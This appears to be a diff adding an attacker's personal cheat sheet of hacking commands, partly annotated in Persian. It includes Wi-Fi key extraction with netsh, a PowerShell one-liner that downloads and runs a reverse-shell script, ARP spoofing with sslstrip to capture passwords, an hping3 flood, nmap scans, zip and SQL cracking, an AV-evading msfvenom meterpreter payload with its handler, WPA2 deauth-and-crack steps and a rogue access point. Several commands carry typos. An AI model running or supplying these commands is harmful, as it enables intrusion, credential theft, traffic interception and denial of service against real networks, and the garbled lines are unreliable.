@@ -1,0 +1,140 @@
+netsh wlan show profiles   وای فای
+netsh w4lan show profile (اسم وایفای مورد نظر) key=clear
+
+sudo arp-scan --interface=wlan0 --localnet
+sudo nbtscan 192.168.1.0/24
+
+stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 192.168.1.12
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+
+
+echo 1/0 > /proc/sys/net/ipv4/ip_forward 
+arpspoof -i eth0 -t route (echo 1 > /proc/sys/net/ipv4/ip_forward)
+sslstrip -l 8080
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80
+sslstrip -l 8080 -w captured.log
+cat captured.log | grep "password"
+
+
+
+airdump-ng start wlan0
+airdump-ng  mon0
+airdump-ng -c 4 -a --bssid mac address  mon0
+airdump-ng stop wlan0
+macchanger
+ifconfig wlan0 down/up
+iwconfig wlan0 essid name channel 4
+
+hping3 -1 –flood -a 192.168.2.100  (dos)
+
+
+steghide
+setoolkit
+
+nmap -sS 192.168.86.32 (port scanning)
+nmap -sT -p 80,443 192.168.86.0/24  (Nmap ull Connect Scan)
+nmap -sX 192.168.86.32 (unning an XMAS Scan with Nmap)
+nmap -sU -T 4 192.168.86.32  (UDP Scanning)
+nmap -sV 192.168.86.32  (Nmap Version Scan)
+nmap -O 192.168.86.32 192.168.86.30   (perating System Scan with Nmap)
+nmap -sS --script=discovery 192.168.86.0/24   (Nmap iscovery Script)
+nmap -sS --script "smb2*" -T 4 192.168.86.32  (Nmap Using Wildcards)
+
+
+
+
+zip2john file.zip > hash.txt
+john --wordlist=/path/to/wordlist.txt hash.txt   /usr/share/wordlists/rockyou.txt
+
+
+sqlmap -r ~~~  -D ~~ -T users --dump
+
+AV bypass
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+exploit
+
+
+cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
+powershell -encodedcommand <Base64_String>
+
+
+
+
+
+
+
+
+
+
+
+######wifi#########################################################################################################################################################################################################################
+
+airdump-ng start wlan0
+airdump-ng  mon0
+airdump-ng -c 4 -a --bssid mac address  mon0
+airdump-ng stop wlan0
+macchanger
+ifconfig wlan0 down/up
+iwconfig wlan0 essid name channel 4
+
+
+
+
+((  wifi(hacks WPA2 cranking)
+Check wlans:
+
+ifconfig
+ip addr show
+airmon-ng
+Create the monitoring dev (mono)
+
+airmon-ng start wlan0
+airmon-ng #will show it
+Collect data
+
+airodump-ng mono #will show ESSID & MAC
+airodump-ng-w FILE -c 1-bssid MAC mono #save on chan1 and into file
+
+aireplay-ng-0 0-a MAC mono # infinite de auth
+Stop the collection
+
+Crack
+
+aircrack-ng FILE.cap-w /pentest/passwords/wordlists/dark  ))
+
+
+Rouge 
+((   apt-get install dhcp3-server -y
+
+dhcpd.conf:
+ddns-update-style ad-hoc;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.2.0 netmask 255.255.255.0 {
+option subnet-mask 255.255.255.0;
+option broadcast-address 192.168.2.255;
+option routers 192.168.2.1;
+option domain-name-servers 8.8.8.8;
+range 192.168.2.51 192.168.2.100;
+
+airbase-ng --essid"your name" -c 6 mon0 #CREATE your Access point
+ifconfig at0 up
+ifconfig at0 192.168.2.1/24
+route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
+dhcpd3 -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0
+
+
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface ath0 -j ACCEPT
+echo 1 > /proc/sys/net/ipv4/ip_forward
